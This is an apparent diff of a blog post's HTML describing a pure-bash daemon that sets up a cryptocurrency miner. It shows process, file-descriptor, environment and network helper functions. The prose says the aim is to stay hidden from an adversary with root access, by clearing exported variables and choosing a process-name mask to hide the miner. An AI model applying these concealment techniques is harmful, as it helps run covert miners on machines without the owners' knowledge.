-    <span class="hljs-keyword">if</span> ! <span class="hljs-built_in">command</span> &gt;&amp;<span class="hljs-variable">${_snore_fd}</span>; <span class="hljs-keyword">then</span>
+    <span class=hljs-comment ># log &quot;fleep: starting waiting with ${_snore_fd}&quot;</span>
+    <span class=hljs-keyword >if</span> ! <span class=hljs-built_in >command</span> &gt;&amp;<span class=hljs-variable >${_snore_fd}</span>; <span class=hljs-keyword >then</span>
         newfd _snore_fd
-    <span class="hljs-keyword">fi</span>
-    <span class="hljs-built_in">read</span> -t <span class="hljs-variable">${1:-1}</span> -u <span class="hljs-variable">$_snore_fd</span>
-    <span class="hljs-comment"># log &quot;fleep: ended&quot;</span>
+    <span class=hljs-keyword >fi</span>
+    <span class=hljs-built_in >read</span> -t <span class=hljs-variable >${1:-1}</span> -u <span class=hljs-variable >$_snore_fd</span>
+    <span class=hljs-comment ># log &quot;fleep: ended&quot;</span>
 }</code></pre>
 <p>Sleeping without forking, by abusing the timeout functionality of the read builtin, it uses a dedicated file descriptor and we must ensure that it is available to avoid termination.</p>
 <p>There are functions like <code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> are used to monitor system usage, these all make use of the linux <code>/proc</code> files without tools like <code>ps</code>, so no forking, all pure bash.</p>
-<pre><code class="bash hljs"><span class="hljs-function"><span class="hljs-title">start_coproc</span></span>() {
-    <span class="hljs-built_in">local</span> <span class="hljs-built_in">unset</span>
-    <span class="hljs-keyword">while</span> :; <span class="hljs-keyword">do</span>
-        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> = <span class="hljs-built_in">exec</span> ]; <span class="hljs-keyword">then</span>
-            coproc_name=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span>
-        <span class="hljs-keyword">else</span>
-            coproc_name=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>
-        <span class="hljs-keyword">fi</span>
+<pre><code class="bash hljs"><span class=hljs-function ><span class=hljs-title >start_coproc</span></span>() {
+    <span class=hljs-built_in >local</span> <span class=hljs-built_in >unset</span>
+    <span class=hljs-keyword >while</span> :; <span class=hljs-keyword >do</span>
+        <span class=hljs-keyword >if</span> [ <span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span> = <span class=hljs-built_in >exec</span> ]; <span class=hljs-keyword >then</span>
+            coproc_name=<span class=hljs-string >&quot;<span class=hljs-variable >$2</span>&quot;</span>
+        <span class=hljs-keyword >else</span>
+            coproc_name=<span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span>
+        <span class=hljs-keyword >fi</span>
 
-        <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$UNSET_COPROC_VARS</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-            <span class="hljs-built_in">unset</span>=<span class="hljs-string">&quot;unset <span class="hljs-variable">$UNSET_COPROC_VARS</span>;&quot;</span>
-        <span class="hljs-keyword">fi</span>
+        <span class=hljs-keyword >if</span> [ -n <span class=hljs-string >&quot;<span class=hljs-variable >$UNSET_COPROC_VARS</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+            <span class=hljs-built_in >unset</span>=<span class=hljs-string >&quot;unset <span class=hljs-variable >$UNSET_COPROC_VARS</span>;&quot;</span>
+        <span class=hljs-keyword >fi</span>
 
-        <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;starting coproc <span class="hljs-variable">$coproc_name</span>&quot;</span>
-        <span class="hljs-built_in">unset</span> -v <span class="hljs-string">&quot;<span class="hljs-variable">$coproc_name</span>&quot;</span> <span class="hljs-comment">## only the variable, not functions</span>
-        <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;coproc <span class="hljs-variable">$coproc_name</span> { <span class="hljs-variable">$unset</span> $*; }&quot;</span> <span class="hljs-comment"># 2&gt;/dev/null</span>
-        <span class="hljs-built_in">unset</span> UNSET_COPROC_VARS
-        wait_coproc <span class="hljs-string">&quot;<span class="hljs-variable">$coproc_name</span>&quot;</span> 3 &amp;&amp; <span class="hljs-built_in">break</span>
-    <span class="hljs-keyword">done</span>
+        <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;starting coproc <span class=hljs-variable >$coproc_name</span>&quot;</span>
+        <span class=hljs-built_in >unset</span> -v <span class=hljs-string >&quot;<span class=hljs-variable >$coproc_name</span>&quot;</span> <span class=hljs-comment >## only the variable, not functions</span>
+        <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;coproc <span class=hljs-variable >$coproc_name</span> { <span class=hljs-variable >$unset</span> $*; }&quot;</span> <span class=hljs-comment ># 2&gt;/dev/null</span>
+        <span class=hljs-built_in >unset</span> UNSET_COPROC_VARS
+        wait_coproc <span class=hljs-string >&quot;<span class=hljs-variable >$coproc_name</span>&quot;</span> 3 &amp;&amp; <span class=hljs-built_in >break</span>
+    <span class=hljs-keyword >done</span>
 }
-<span class="hljs-function"><span class="hljs-title">stop_coproc</span></span>() {
-    <span class="hljs-comment">## clear fds</span>
-    id_coproc <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> &amp;&amp; [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$job_n</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;kill -<span class="hljs-variable">${2:-9}</span> %<span class="hljs-variable">$job_n</span>&quot;</span> ||
-        { <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;kill -<span class="hljs-variable">${2:-9}</span> \${<span class="hljs-variable">${1}</span>_PID}&quot;</span>; } ||
-        { <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;could not kill the specified coprocess with job <span class="hljs-variable">$job_n</span>&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1; }
+<span class=hljs-function ><span class=hljs-title >stop_coproc</span></span>() {
+    <span class=hljs-comment >## clear fds</span>
+    id_coproc <span class=hljs-string >&quot;<span class=hljs-variable >$1</span>&quot;</span> &amp;&amp; [ -n <span class=hljs-string >&quot;<span class=hljs-variable >$job_n</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;kill -<span class=hljs-variable >${2:-9}</span> %<span class=hljs-variable >$job_n</span>&quot;</span> ||
+        { <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;kill -<span class=hljs-variable >${2:-9}</span> \${<span class=hljs-variable >${1}</span>_PID}&quot;</span>; } ||
+        { <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;could not kill the specified coprocess with job <span class=hljs-variable >$job_n</span>&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span> 1; }
 }</code></pre>
 <p>Coprocesses are available since bash <code>v4</code>, they are like jobs except they have a name and their own file descriptors.</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## clear file descriptors</span>
-<span class="hljs-function"><span class="hljs-title">clear_fds</span></span>() {
-    <span class="hljs-built_in">local</span> fd
-    <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> $(compgen -G <span class="hljs-string">&quot;/proc/<span class="hljs-variable">$BASHPID</span>/fd/*&quot;</span>); <span class="hljs-keyword">do</span>
-        fd=<span class="hljs-variable">${fd/*\/}</span>
-            <span class="hljs-keyword">if</span> [[ ! <span class="hljs-string">&quot; $* &quot;</span> =~ <span class="hljs-string">&quot; <span class="hljs-variable">${fd}</span> &quot;</span> ]]; <span class="hljs-keyword">then</span>
-                <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$fd</span>&quot;</span> <span class="hljs-keyword">in</span>
-                    0|1|2|255|<span class="hljs-string">&quot;<span class="hljs-variable">$_snore_fd</span>&quot;</span>)
+<pre><code class="bash hljs"><span class=hljs-comment >## clear file descriptors</span>
+<span class=hljs-function ><span class=hljs-title >clear_fds</span></span>() {
+    <span class=hljs-built_in >local</span> fd
+    <span class=hljs-keyword >for</span> fd <span class=hljs-keyword >in</span> $(compgen -G <span class=hljs-string >&quot;/proc/<span class=hljs-variable >$BASHPID</span>/fd/*&quot;</span>); <span class=hljs-keyword >do</span>
+        fd=<span class=hljs-variable >${fd/*\/}</span>
+            <span class=hljs-keyword >if</span> [[ ! <span class=hljs-string >&quot; $* &quot;</span> =~ <span class=hljs-string >&quot; <span class=hljs-variable >${fd}</span> &quot;</span> ]]; <span class=hljs-keyword >then</span>
+                <span class=hljs-keyword >case</span> <span class=hljs-string >&quot;<span class=hljs-variable >$fd</span>&quot;</span> <span class=hljs-keyword >in</span>
+                    0|1|2|255|<span class=hljs-string >&quot;<span class=hljs-variable >$_snore_fd</span>&quot;</span>)
                     ;;
                     *)
-                        <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;exec <span class="hljs-variable">$fd</span>&gt;&amp;-&quot;</span>
+                        <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;exec <span class=hljs-variable >$fd</span>&gt;&amp;-&quot;</span>
                         ;;
-                <span class="hljs-keyword">esac</span>
-            <span class="hljs-keyword">fi</span>
-    <span class="hljs-keyword">done</span>
+                <span class=hljs-keyword >esac</span>
+            <span class=hljs-keyword >fi</span>
+    <span class=hljs-keyword >done</span>
 }</code></pre>
 <p>We are writing a daemon, which is a long lived process, and we are using many file descriptors, we really want to do some cleanups to avoid incurring in <a href="https://web.archive.org/web/https://linux.die.net/man/5/limits.conf">ulimits</a>.</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## queries ipinfo and gets the current ip and country/region</span>
-<span class="hljs-function"><span class="hljs-title">parse_ip</span></span> ()
+<pre><code class="bash hljs"><span class=hljs-comment >## queries ipinfo and gets the current ip and country/region</span>
+<span class=hljs-function ><span class=hljs-title >parse_ip</span></span> ()
 {
-    <span class="hljs-built_in">export</span> ip country region;
-    [ ! -e cfg/geoip.json ] &amp;&amp; <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;geolocation codes file not found.&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
+    <span class=hljs-built_in >export</span> ip country region;
+    [ ! -e cfg/geoip.json ] &amp;&amp; <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;geolocation codes file not found.&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span> 1;
     ipquery=$(http_req ipinfo.io);
-    [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$ipquery</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;failed querying ipinfo&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
-    before_after <span class="hljs-string">&#x27;ip\&quot;: \&quot;&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ipquery</span>&quot;</span> <span class="hljs-string">&#x27;\&quot;&#x27;</span>;
-    ip=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$after</span>);
-    [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$ip</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;failed parsing ipinfo data ip&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
-    before_after <span class="hljs-string">&#x27;country\&quot;: \&quot;&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$ipquery</span>&quot;</span> <span class="hljs-string">&#x27;\&quot;&#x27;</span>;
-    country=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">${after,,}</span>);
-    [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$country</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">log</span> <span class="hljs-string">&quot;failed parsing ipinfo data country&quot;</span> &amp;&amp; <span class="hljs-built_in">return</span> 1;
-    <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span>
-        <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">${l}</span>&quot;</span> != <span class="hljs-string">&quot;<span class="hljs-variable">${l/\&quot;: {}</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-            before_after <span class="hljs-string">&#x27;&quot;&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$l</span>&quot;</span> <span class="hljs-string">&#x27;&quot;&#x27;</span>;
-            lastregion=$(<span class="hljs-built_in">echo</span> <span class="hljs-variable">$after</span>);
-        <span class="hljs-keyword">else</span>
-            <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">${l}</span>&quot;</span> != <span class="hljs-string">&quot;<span class="hljs-variable">${l/\&quot;<span class="hljs-variable">${country}</span>\&quot;}</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-                region=<span class="hljs-variable">$lastregion</span>;
-                <span class="hljs-built_in">break</span>;
-            <span class="hljs-keyword">fi</span>;
-        <span class="hljs-keyword">fi</span>;
-    <span class="hljs-keyword">done</span> &lt; cfg/geoip.json
+    [ -z <span class=hljs-string >&quot;<span class=hljs-variable >$ipquery</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;failed querying ipinfo&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span> 1;
+    before_after <span class=hljs-string >&#x27;ip\&quot;: \&quot;&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >$ipquery</span>&quot;</span> <span class=hljs-string >&#x27;\&quot;&#x27;</span>;
+    ip=$(<span class=hljs-built_in >echo</span> <span class=hljs-variable >$after</span>);
+    [ -z <span class=hljs-string >&quot;<span class=hljs-variable >$ip</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;failed parsing ipinfo data ip&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span> 1;
+    before_after <span class=hljs-string >&#x27;country\&quot;: \&quot;&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >$ipquery</span>&quot;</span> <span class=hljs-string >&#x27;\&quot;&#x27;</span>;
+    country=$(<span class=hljs-built_in >echo</span> <span class=hljs-variable >${after,,}</span>);
+    [ -z <span class=hljs-string >&quot;<span class=hljs-variable >$country</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >log</span> <span class=hljs-string >&quot;failed parsing ipinfo data country&quot;</span> &amp;&amp; <span class=hljs-built_in >return</span> 1;
+    <span class=hljs-keyword >while</span> <span class=hljs-built_in >read</span> l; <span class=hljs-keyword >do</span>
+        <span class=hljs-keyword >if</span> [ <span class=hljs-string >&quot;<span class=hljs-variable >${l}</span>&quot;</span> != <span class=hljs-string >&quot;<span class=hljs-variable >${l/\&quot;: {}</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+            before_after <span class=hljs-string >&#x27;&quot;&#x27;</span> <span class=hljs-string >&quot;<span class=hljs-variable >$l</span>&quot;</span> <span class=hljs-string >&#x27;&quot;&#x27;</span>;
+            lastregion=$(<span class=hljs-built_in >echo</span> <span class=hljs-variable >$after</span>);
+        <span class=hljs-keyword >else</span>
+            <span class=hljs-keyword >if</span> [ <span class=hljs-string >&quot;<span class=hljs-variable >${l}</span>&quot;</span> != <span class=hljs-string >&quot;<span class=hljs-variable >${l/\&quot;<span class=hljs-variable >${country}</span>\&quot;}</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+                region=<span class=hljs-variable >$lastregion</span>;
+                <span class=hljs-built_in >break</span>;
+            <span class=hljs-keyword >fi</span>;
+        <span class=hljs-keyword >fi</span>;
+    <span class=hljs-keyword >done</span> &lt; cfg/geoip.json
 }</code></pre>
 <p>This function relies on <a href="https://ipinfo.io/">ipinfo</a> to determine the region of the worker, which allows to tune some region dependent logic, <a href="\assets/posts/geoip.json">geoip.json</a> groups countries into regions, since we want the top level region, and are not interested in the specific country.</p>
-<pre><code class="bash hljs"><span class="hljs-comment"># try to open a connection to host $1 with port $2 and output to $3</span>
-<span class="hljs-function"><span class="hljs-title">open_connection</span></span>() {
-    <span class="hljs-built_in">exec</span> {socket}&lt;&gt;/dev/tcp/<span class="hljs-variable">${1}</span>/<span class="hljs-variable">${2}</span> 2&gt;/dev/null
-    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$socket</span> &gt;&amp;<span class="hljs-variable">${3}</span>
+<pre><code class="bash hljs"><span class=hljs-comment ># try to open a connection to host $1 with port $2 and output to $3</span>
+<span class=hljs-function ><span class=hljs-title >open_connection</span></span>() {
+    <span class=hljs-built_in >exec</span> {socket}&lt;&gt;/dev/tcp/<span class=hljs-variable >${1}</span>/<span class=hljs-variable >${2}</span> 2&gt;/dev/null
+    <span class=hljs-built_in >echo</span> <span class=hljs-variable >$socket</span> &gt;&amp;<span class=hljs-variable >${3}</span>
 }
 
-<span class="hljs-comment">## check if a tcp connection to $1=$HOST $2=$PORT is successful</span>
-<span class="hljs-function"><span class="hljs-title">check_connection</span></span>() {
-    <span class="hljs-built_in">local</span> host=<span class="hljs-variable">$1</span> port=<span class="hljs-variable">$2</span> conn_socket=
-    [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$host</span>&quot;</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;no host provided&#x27;</span>; <span class="hljs-built_in">return</span> 1; }
-    [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$port</span>&quot;</span> ] &amp;&amp; { <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;no port provided&#x27;</span>; <span class="hljs-built_in">return</span> 1; }
+<span class=hljs-comment >## check if a tcp connection to $1=$HOST $2=$PORT is successful</span>
+<span class=hljs-function ><span class=hljs-title >check_connection</span></span>() {
+    <span class=hljs-built_in >local</span> host=<span class=hljs-variable >$1</span> port=<span class=hljs-variable >$2</span> conn_socket=
+    [ -z <span class=hljs-string >&quot;<span class=hljs-variable >$host</span>&quot;</span> ] &amp;&amp; { <span class=hljs-built_in >echo</span> <span class=hljs-string >&#x27;no host provided&#x27;</span>; <span class=hljs-built_in >return</span> 1; }
+    [ -z <span class=hljs-string >&quot;<span class=hljs-variable >$port</span>&quot;</span> ] &amp;&amp; { <span class=hljs-built_in >echo</span> <span class=hljs-string >&#x27;no port provided&#x27;</span>; <span class=hljs-built_in >return</span> 1; }
     newfd conn_socket
-    timeout 3 open_connection <span class="hljs-variable">$host</span> <span class="hljs-variable">$port</span> <span class="hljs-variable">$conn_socket</span>
-    <span class="hljs-comment"># read the fd of the opened connection from the conn_socket fd and close it</span>
-    read_fd <span class="hljs-variable">$conn_socket</span> avl -
-    <span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$avl</span>&quot;</span> ]; <span class="hljs-keyword">then</span>
-        <span class="hljs-comment"># close connection</span>
-        <span class="hljs-built_in">eval</span> <span class="hljs-string">&quot;exec <span class="hljs-variable">${avl}</span>&lt;&amp;-&quot;</span> &amp;&gt;/dev/null
-        <span class="hljs-built_in">return</span> 0 <span class="hljs-comment">## connection can be established</span>
-    <span class="hljs-keyword">else</span>
-        <span class="hljs-built_in">return</span> 1 <span class="hljs-comment">## connection can&#x27;t be established</span>
-    <span class="hljs-keyword">fi</span>
+    timeout 3 open_connection <span class=hljs-variable >$host</span> <span class=hljs-variable >$port</span> <span class=hljs-variable >$conn_socket</span>
+    <span class=hljs-comment ># read the fd of the opened connection from the conn_socket fd and close it</span>
+    read_fd <span class=hljs-variable >$conn_socket</span> avl -
+    <span class=hljs-keyword >if</span> [ -n <span class=hljs-string >&quot;<span class=hljs-variable >$avl</span>&quot;</span> ]; <span class=hljs-keyword >then</span>
+        <span class=hljs-comment ># close connection</span>
+        <span class=hljs-built_in >eval</span> <span class=hljs-string >&quot;exec <span class=hljs-variable >${avl}</span>&lt;&amp;-&quot;</span> &amp;&gt;/dev/null
+        <span class=hljs-built_in >return</span> 0 <span class=hljs-comment >## connection can be established</span>
+    <span class=hljs-keyword >else</span>
+        <span class=hljs-built_in >return</span> 1 <span class=hljs-comment >## connection can&#x27;t be established</span>
+    <span class=hljs-keyword >fi</span>
 }</code></pre>
 <p>Bash has support for tcp connections, by having an abstraction over <code>/dev/tcp</code> &#40;also for udp, but most it seems to be usually disabled at build time, so you can&#39;t rely on it&#41;. These files are a bash thing, they are not part of the linux <code>/dev</code> tree.</p>
 <p>Worth mentioning also a locking system to handle concurrency between bash jobs. To allow multiple jobs to work with locks they all need to share a file descriptor, so our <code>locker</code> which is also a job, has to be started before other jobs wishing to use the lock. The locker simply reads on <code>stdin</code> waiting for locking requests, responding on <code>stdout</code> depending on the current boolean state stored in a variable. I don&#39;t guarantee that this approach is race free, but seems to work decently, on the other hand, I have found file descriptors to not be very reliable, as I suspect there are some buffers that do not get flushed somewhere down the <em>pipes</em> and eventually hitting deadlocks &#40;which means that you cannot rely on the locker giving you an answer all the times&#41;.</p>
-<pre><code class="bash hljs"><span class="hljs-comment">## unset bash env apart excluded vars/funcs</span>
-<span class="hljs-function"><span class="hljs-title">clear_env</span></span>(){
-    <span class="hljs-built_in">local</span> <span class="hljs-built_in">functions</span>=$(<span class="hljs-built_in">declare</span> -F)
-    <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions//declare -f }</span>
-    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> <span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span>
-        <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/$u[[:space:]]}</span>
-        <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u}</span>
-        <span class="hljs-built_in">functions</span>=<span class="hljs-variable">${functions/[[:space:]]$u[[:space:]]}</span>
-    <span class="hljs-keyword">done</span>
-    <span class="hljs-built_in">local</span> vars=$(<span class="hljs-built_in">set</span> -o posix; <span class="hljs-built_in">set</span> | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> l; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">${l/=*}</span>; <span class="hljs-keyword">done</span>)
-    <span class="hljs-keyword">for</span> u <span class="hljs-keyword">in</span> <span class="hljs-variable">$@</span>; <span class="hljs-keyword">do</span>
-        vars=<span class="hljs-variable">${vars/$u[[:space:]]}</span>
-        vars=<span class="hljs-variable">${vars/[[:space]]$u}</span>
-        vars=<span class="hljs-variable">${vars/[[:space:]]$u[[:space:]]}</span>
-    <span class="hljs-keyword">done</span>
-    <span class="hljs-built_in">unset</span> -f <span class="hljs-variable">$functions</span> &amp;&gt;/dev/null
-    <span class="hljs-built_in">unset</span> -v <span class="hljs-variable">$vars</span> &amp;&gt;/dev/null
-    <span class="hljs-comment"># unset $vars &amp;&gt;/dev/null</span>
+<pre><code class="bash hljs"><span class=hljs-comment >## unset bash env apart excluded vars/funcs</span>
+<span class=hljs-function ><span class=hljs-title >clear_env</span></span>(){
+    <span class=hljs-built_in >local</span> <span class=hljs-built_in >functions</span>=$(<span class=hljs-built_in >declare</span> -F)
+    <span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions//declare -f }</span>
+    <span class=hljs-keyword >for</span> u <span class=hljs-keyword >in</span> <span class=hljs-variable >$@</span>; <span class=hljs-keyword >do</span>
+        <span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions/$u[[:space:]]}</span>
+        <span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions/[[:space:]]$u}</span>
+        <span class=hljs-built_in >functions</span>=<span class=hljs-variable >${functions/[[:space:]]$u[[:space:]]}</span>
+    <span class=hljs-keyword >done</span>
+    <span class=hljs-built_in >local</span> vars=$(<span class=hljs-built_in >set</span> -o posix; <span class=hljs-built_in >set</span> | <span class=hljs-keyword >while</span> <span class=hljs-built_in >read</span> l; <span class=hljs-keyword >do</span> <span class=hljs-built_in >echo</span> <span class=hljs-variable >${l/=*}</span>; <span class=hljs-keyword >done</span>)
+    <span class=hljs-keyword >for</span> u <span class=hljs-keyword >in</span> <span class=hljs-variable >$@</span>; <span class=hljs-keyword >do</span>
+        vars=<span class=hljs-variable >${vars/$u[[:space:]]}</span>
+        vars=<span class=hljs-variable >${vars/[[:space]]$u}</span>
+        vars=<span class=hljs-variable >${vars/[[:space:]]$u[[:space:]]}</span>
+    <span class=hljs-keyword >done</span>
+    <span class=hljs-built_in >unset</span> -f <span class=hljs-variable >$functions</span> &amp;&gt;/dev/null
+    <span class=hljs-built_in >unset</span> -v <span class=hljs-variable >$vars</span> &amp;&gt;/dev/null
+    <span class=hljs-comment ># unset $vars &amp;&gt;/dev/null</span>
 }
 
-<span class="hljs-comment">## unexport most variables</span>
-<span class="hljs-function"><span class="hljs-title">dex_env</span></span>() {
-    exported=$(<span class="hljs-built_in">export</span> -p)
-    <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> e; <span class="hljs-keyword">do</span>
-        n=<span class="hljs-variable">${e/declare -*x }</span>
-        [ <span class="hljs-string">&quot;<span class="hljs-variable">$n</span>&quot;</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$e</span>&quot;</span> ] &amp;&amp; <span class="hljs-built_in">continue</span> <span class="hljs-comment">## multiline var</span>
-        n=<span class="hljs-variable">${n/=*}</span>
-        <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;<span class="hljs-variable">$n</span>&quot;</span> <span class="hljs-keyword">in</span>
-            <span class="hljs-string">&quot;SHELL&quot;</span>|<span class="hljs-string">&quot;USER&quot;</span>|<span class="hljs-string">&quot;HOME&quot;</span>|<span class="hljs-string">&quot;TMUX&quot;</span>|<span class="hljs-string">&quot;CHARSET&quot;</span>|<span class="hljs-string">&quot;TERM&quot;</span>)
-                <span class="hljs-built_in">continue</span>
+<span class=hljs-comment >## unexport most variables</span>
+<span class=hljs-function ><span class=hljs-title >dex_env</span></span>() {
+    exported=$(<span class=hljs-built_in >export</span> -p)
+    <span class=hljs-keyword >while</span> <span class=hljs-built_in >read</span> e; <span class=hljs-keyword >do</span>
+        n=<span class=hljs-variable >${e/declare -*x }</span>
+        [ <span class=hljs-string >&quot;<span class=hljs-variable >$n</span>&quot;</span> = <span class=hljs-string >&quot;<span class=hljs-variable >$e</span>&quot;</span> ] &amp;&amp; <span class=hljs-built_in >continue</span> <span class=hljs-comment >## multiline var</span>
+        n=<span class=hljs-variable >${n/=*}</span>
+        <span class=hljs-keyword >case</span> <span class=hljs-string >&quot;<span class=hljs-variable >$n</span>&quot;</span> <span class=hljs-keyword >in</span>
+            <span class=hljs-string >&quot;SHELL&quot;</span>|<span class=hljs-string >&quot;USER&quot;</span>|<span class=hljs-string >&quot;HOME&quot;</span>|<span class=hljs-string >&quot;TMUX&quot;</span>|<span class=hljs-string >&quot;CHARSET&quot;</span>|<span class=hljs-string >&quot;TERM&quot;</span>)
+                <span class=hljs-built_in >continue</span>
                 ;;
             *)
-                dexported=<span class="hljs-string">&quot;<span class="hljs-variable">$dexported</span> <span class="hljs-variable">${n/=*}</span>&quot;</span>
-        <span class="hljs-keyword">esac</span>
-    <span class="hljs-keyword">done</span> &lt;&lt;&lt;<span class="hljs-string">&quot;<span class="hljs-variable">$exported</span>&quot;</span>
-    <span class="hljs-built_in">export</span> -n <span class="hljs-variable">$dexported</span>
+                dexported=<span class=hljs-string >&quot;<span class=hljs-variable >$dexported</span> <span class=hljs-variable >${n/=*}</span>&quot;</span>
+        <span class=hljs-keyword >esac</span>
+    <span class=hljs-keyword >done</span> &lt;&lt;&lt;<span class=hljs-string >&quot;<span class=hljs-variable >$exported</span>&quot;</span>
+    <span class=hljs-built_in >export</span> -n <span class=hljs-variable >$dexported</span>
 }</code></pre>
-<p>Clean up your garbage...complex bash programs end up using many variables, and if you abuse the global space it gets bloaty. If you are spawning shell jobs, they inherit all the environment &#40;which is effectively duplicated, not shared&#41;, you can quickly end up with bash eating <code>100M</code> of memory, not nice. Also we really want to be low profile. In our deployment scenario, the adversary <sup id="fnref:adversary"><a href="#fndef:adversary" class="fnref">[1]</a></sup> can potentially have root access and complete information about our processes <sup id="fnref:infoproc"><a href="#fndef:infoproc" class="fnref">[2]</a></sup> , and you know...every process holds information about the full command that started it, and the exported environment variables.</p>
-<h2 id="configuration"><a href="#configuration" class="header-anchor">Configuration</a></h2>
+<p>Clean up your garbage...complex bash programs end up using many variables, and if you abuse the global space it gets bloaty. If you are spawning shell jobs, they inherit all the environment &#40;which is effectively duplicated, not shared&#41;, you can quickly end up with bash eating <code>100M</code> of memory, not nice. Also we really want to be low profile. In our deployment scenario, the adversary <sup id="fnref:adversary"><a href="#fndef:adversary" class=fnref >[1]</a></sup> can potentially have root access and complete information about our processes <sup id="fnref:infoproc"><a href="#fndef:infoproc" class=fnref >[2]</a></sup> , and you know...every process holds information about the full command that started it, and the exported environment variables.</p>
+<h2 id=configuration ><a href="#configuration" class=header-anchor >Configuration</a></h2>
 <p>Once we have our environment, and our tools, we have to tune our miner for the machine it is running on, configuration steps in pseudo code:</p>
 <ul>
 <li><p>process name for the miner</p>
-</li>
+
 <li><p>host infos &#40;ram/cores/caches/<code>ENV_VARS</code>&#41;</p>
-</li>
+
 <li><p>configuration version</p>
-</li>
+
 <li><p><code>worker_id</code> for the miner &#40;from ip and host&#41;</p>
-</li>
+
 <li><p>ip/port for the connection</p>
-</li>
+
 </ul>
 <p>Choosing a name for the process is required to <em>hide</em> the fact that we are running a miner, but we are not just renaming our binary, we have a list of <strong>masks</strong> for potential candidates &#40;a plain text file where each line is a mask&#41;:</p>
 <ul>
 <li><p>pick a mask at random</p>
-</li>
+
